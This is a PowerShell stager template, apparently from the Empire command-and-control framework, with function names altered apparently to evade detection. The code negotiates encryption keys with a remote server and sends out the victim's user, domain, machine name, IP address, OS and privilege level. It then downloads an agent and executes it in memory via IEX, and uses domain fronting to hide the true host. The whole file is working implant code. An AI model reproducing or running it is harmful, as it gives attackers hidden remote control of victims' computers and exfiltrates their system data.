#################################################################
# This file is a Jinja2 template.
#    Variables:
#        working_hours
#        kill_date
#        staging_key
#        profile
#################################################################

{ % include 'http/comms.ps1' % }
$force = 0;

#function Perform-PrimeCheck { $maxNumber = 567765; $primes = @(); for ($i = 2; $i -le $maxNumber; $i++) { $isPrime = $true; for ($j = 2; $j -le [math]::Sqrt($i); $j++) { if ($i % $j -eq 0) { $isPrime = $false; break } }; if ($isPrime) { $primes += $i } } };

function Start-Negotiate {
    param($s, $SK, $UA = 'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko', $hop)

    function Change-To-Bstream {
        Param ($mck, $In)
        process {
            ForEach ($Element in $In) {
                $Idx2 = ($Idx2 + 1) % 256;
                $Idx1 = ($Idx1 + $Arr[$Idx2]) % 256;
                $Arr[$Idx2], $Arr[$Idx1] = $Arr[$Idx1], $Arr[$Idx2];
                $Element -bxor $Arr[($Arr[$Idx2] + $Arr[$Idx1]) % 256];
            }
        }
        begin {
            [Byte[]] $Arr = 0..255;
            $Idx1 = 0;
            0..255 | ForEach-Object {
                $Idx1 = ($Idx1 + $Arr[$_] + $mck[$_ % $mck.Length]) % 256;
                $Arr[$_], $Arr[$Idx1] = $Arr[$Idx1], $Arr[$_];
            };
            $Idx2 = $Idx1 = 0;
        }
    }

    function Read-Things {
        param ($mk, $In)
        if ($In.Length -gt 32) {
            $Hsh = New-Object System.Security.Cryptography.HMACSHA256;
            $Enc = [System.Text.Encoding]::ASCII;
            # Verify the HMAC
            $Chk = $In[-10..-1];
            $Dat = $In[0..($In.length - 11)];
            $Hsh.Key = $Enc.GetBytes($mk);
            $Exp = $Hsh.ComputeHash($Dat)[0..9];
            if (@(Compare-Object $Chk $Exp -Sync 0).Length -ne 0) {
                return;
            }
        
            # extract the IV
            $Vec = $Dat[0..15];
            try {
                $AesObj = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
            }
            catch {
                $AesObj = New-Object System.Security.Cryptography.RijndaelManaged;
            }
            $AesObj.Mode = "CBC";
            $AesObj.Key = $Enc.GetBytes($mk);
            $AesObj.IV = $Vec;
            ($AesObj.CreateDecryptor()).TransformFinalBlock(($Dat[16..$Dat.length]), 0, $Dat.Length - 16)
        }               
    }

    # make sure the appropriate assemblies are loaded
    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Security");
    $nope = [Reflection.Assembly]::LoadWithPartialName("System.Core");

    # try to ignore all errors
    $ErrorActionPreference = "SilentlyContinue";
    $e = [System.Text.Encoding]::UTF8;
    $customHeaders = "";
    $SKB = $e.GetBytes($SK);
    # set up the AES/HMAC crypto
    # $SK -> staging key for this server
    try {
        $sea = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $sea = New-Object System.Security.Cryptography.RijndaelManaged;
    }
    
    $mIV = [byte] 0..255 | Get-Random -count 16;
    $sea.Mode = "CBC";
    $sea.Key = $SKB;
    $sea.IV = $mIV;

    $hmac = New-Object System.Security.Cryptography.HMACSHA256;
    $hmac.Key = $SKB;

    $csp = New-Object System.Security.Cryptography.CspParameters;
    $csp.Flags = $csp.Flags -bor [System.Security.Cryptography.CspProviderFlags]::UseMachineKeyStore;
    $rs = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 2048, $csp;
    # export the public key in the only format possible...stupid
    $rk = $rs.ToXmlString($False);

    # generate a randomized sessionID of 8 characters
    $ID = -join ("ABCDEFGHKLMNPRSTUVWXYZ123456789".ToCharArray() | Get-Random -Count 8);

    # build the packet of (xml_key)
    $ib = $e.getbytes($rk);

    # encrypt/HMAC the packet for the c2 server
    $eb = $mIV + $sea.CreateEncryptor().TransformFinalBlock($ib, 0, $ib.Length);
    $eb = $eb + $hmac.ComputeHash($eb)[0..9];

    # if the web client doesn't exist, create a new web client and set appropriate options
    #   this only happens if this stager.ps1 code is NOT called from a launcher context
    if (-not $talk) {
        $talk = New-Object System.Net.WebClient;
        # set the proxy settings for the WC to be the default system settings
        $talk.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
        $talk.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
    }

    if ($Script:Proxy) {
        $talk.Proxy = $Script:Proxy;   
    }

    
    # the User-Agent always resets for multiple calls...silly
    if ($customHeaders -ne "") {
        $headers = $customHeaders -split ',';
        $headers | ForEach-Object {
            $headerKey = $_.split(':')[0];
            $headerValue = $_.split(':')[1];
            #If host header defined, assume domain fronting is in use and add a call to the base URL first
            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
            if ($headerKey -eq "host") {
                try { $ig = $talk.DownloadData($s) }catch {}
            };
            $talk.Headers.Add($headerKey, $headerValue);
        }
    }
    $talk.Headers.Add("User-Agent", $UA);
    
    # RC4 routing packet:
    #   sessionID = $ID
    #   language = POWERSHELL (1)
    #   meta = STAGE1 (2)
    #   extra = (0x00, 0x00)
    #   length = len($eb)
    $mIV = [BitConverter]::GetBytes($(Get-Random));
    $data = $e.getbytes($ID) + @(0x01, 0x02, 0x00, 0x00) + [BitConverter]::GetBytes($eb.Length);
    $rc4p = Change-To-Bstream -mck $($mIV + $SKB) -In $data;
    $rc4p = $mIV + $rc4p + $eb;

    # step 3 of negotiation -> client posts AESstaging(PublicKey) to the server
    $raw = $talk.UploadData($s + "/{{ stage_1 }}", "POST", $rc4p);

    # step 4 of negotiation -> server returns RSA(nonce+AESsession))
    $de = $e.GetString($rs.decrypt($raw, $false));

    # packet = server nonce + AES session key
    $nonce = $de[0..15] -join '';
    $key = $de[16..$de.length] -join '';

    # increment the nonce
    $nonce = [String]([long]$nonce + 1);

    # create a new AES object
    try {
        $sea = New-Object System.Security.Cryptography.AesCryptoServiceProvider;
    }
    catch {
        $sea = New-Object System.Security.Cryptography.RijndaelManaged;
    }
    $mIV = [byte] 0..255 | Get-Random -Count 16;
    $sea.Mode = "CBC";
    $sea.Key = $e.GetBytes($key);
    $sea.IV = $mIV;

    # get some basic system information
    $i = $nonce + '|' + $s + '|' + [Environment]::UserDomainName + '|' + [Environment]::UserName + '|' + [Environment]::MachineName;

    try {
        $p = (gwmi Win32_NetworkAdapterConfiguration | Where { $_.IPAddress } | Select -Expand IPAddress);
    }
    catch {
        $p = "[FAILED]"
    }
   

    # check if the IP is a string or the [IPv4,IPv6] array
    $ip = @{$true = $p[0]; $false = $p }[$p.Length -lt 6];
    if (!$ip -or $ip.trim() -eq '') { $ip = '0.0.0.0' };
    $i += "|$ip";

    try {
        $i += '|' + (Get-WmiObject Win32_OperatingSystem).Name.split('|')[0];
    }
    catch {
        $i += '|' + '[FAILED]'
    }

    # detect if we're SYSTEM or otherwise high-integrity
    if (([Environment]::UserName).ToLower() -eq "system") { $i += "|True" }
    else { $i += '|' + ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator") }

    # get the current process name and ID
    $n = [System.Diagnostics.Process]::GetCurrentProcess();
    $i += '|' + $n.ProcessName + '|' + $n.Id;
    # get the powershell.exe version
    $i += "|powershell|" + $PSVersionTable.PSVersion.Major;
    $i += "|" + $env:PROCESSOR_ARCHITECTURE;

    # send back the initial system information
    $ib2 = $e.getbytes($i);
    $eb2 = $mIV + $sea.CreateEncryptor().TransformFinalBlock($ib2, 0, $ib2.Length);
    $hmac.Key = $e.GetBytes($key);
    $eb2 = $eb2 + $hmac.ComputeHash($eb2)[0..9];

    # RC4 routing packet:
    #   sessionID = $ID
    #   language = POWERSHELL (1)
    #   meta = STAGE2 (3)
    #   extra = (0x00, 0x00)
    #   length = len($eb)
    $mIV2 = [BitConverter]::GetBytes($(Get-Random));
    $data2 = $e.getbytes($ID) + @(0x01, 0x03, 0x00, 0x00) + [BitConverter]::GetBytes($eb2.Length);
    $rc4p2 = Change-To-Bstream -mck $($mIV2 + $SKB) -In $data2;
    $rc4p2 = $mIV2 + $rc4p2 + $eb2;

    # the User-Agent always resets for multiple calls...silly
    if ($customHeaders -ne "") {
        $headers = $customHeaders -split ',';
        $headers | ForEach-Object {
            $headerKey = $_.split(':')[0];
            $headerValue = $_.split(':')[1];
            #If host header defined, assume domain fronting is in use and add a call to the base URL first
            #this is a trick to keep the true host name from showing in the TLS SNI portion of the client hello
            if ($headerKey -eq "host") {
                try { $ig = $talk.DownloadData($s) }catch {}
            };
            $talk.Headers.Add($headerKey, $headerValue);
        }
    }
    $talk.Headers.Add("User-Agent", $UA);
    $talk.Headers.Add("Hop-Name", $hop);

    # step 5 of negotiation -> client posts nonce+sysinfo and requests agent
    $raw = $talk.UploadData($s + "/{{ stage_2 }}", "POST", $rc4p2);

    # # decrypt the agent and register the agent logic
    # $data = $e.GetString($(Read-Things -Key $key -In $raw));
    # write-host "data len: $($Data.Length)";
    IEX $( $e.GetString($(Read-Things -mk $key -In $raw)) );

    # clear some variables out of memory and cleanup before execution
    $sea = $null; $s2 = $null; $talk = $null; $eb2 = $null; $raw = $null; $mIV = $null; $i = $null; $ib2 = $null;
    [GC]::Collect();

    # TODO: remove this shitty $server logic
    Start-Chess -myserver @(($s -split "/")[0..2] -join "/") -StagingKey $SK -SessionKey $key -SessionID $ID -WorkingHours "{{ working_hours }}" -KillDate "{{ kill_date }}" -ProxySettings $Script:Proxy;
}

#Perform-PrimeCheck;
# $ser is the server populated from the launcher code, needed here in order to facilitate hop listeners
Start-Negotiate -s "$hom" -SK '{{ staging_key }}' -UA "$aua" -hop "$hop";
